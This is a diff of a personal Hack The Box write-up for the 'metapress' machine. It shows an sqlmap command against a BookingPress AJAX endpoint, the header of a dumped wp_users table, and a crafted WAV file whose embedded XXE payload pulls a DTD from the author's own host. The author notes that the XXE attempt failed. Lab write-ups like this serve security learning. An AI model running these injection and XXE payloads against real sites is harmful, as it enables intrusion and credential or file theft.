@@ -161,6 +161,7 @@ So now i know i can execute sql, i'll use sqlmap to do the heavy lifting, i cant
 
 python3 ./sqlmap.py -u 'http://metapress.htb/wp-admin/admin-ajax.php' --data='action=bookingpress_front_get_category_services&_wpnonce=5c87274b9d&category_id=1&total_service=1'
 
+from dumping wp_users table
 ```
 +----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
 | ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
@@ -232,11 +233,11 @@ As the wpscan referenced above says, this XXE vulnerabilty resides in the audio 
 
 So we need to craft a .wav file to exploit this, so i lookup the wave file header, insert that first and then i will add my crafted XML.
 ```
-RIFFXXXXWAVEBBBBiXML<!DOCTYPE f
-[<!ELEMENT f ANY>
-<!ENTITY % z SYSTEM 'http://10.10.14.31:8000/s;'>
-%z;
-%b;
-]>
-<f>&bye;</f>>
+
+
+RIFF300WAVEBBBBiXML<!DOCTYPE f [
+<!ENTITY % xxe SYSTEM "http://10.10.14.22:8000/crafted.dtd"> %xxe;]>
 ```
+
+# END TBD
+unfortunately it looks like the htb machine may be borked, i have tried a few XXE attacks and even went so far as to copy exactly another walkthrough which also failed on the page, i will come back to this if the site is fixed.
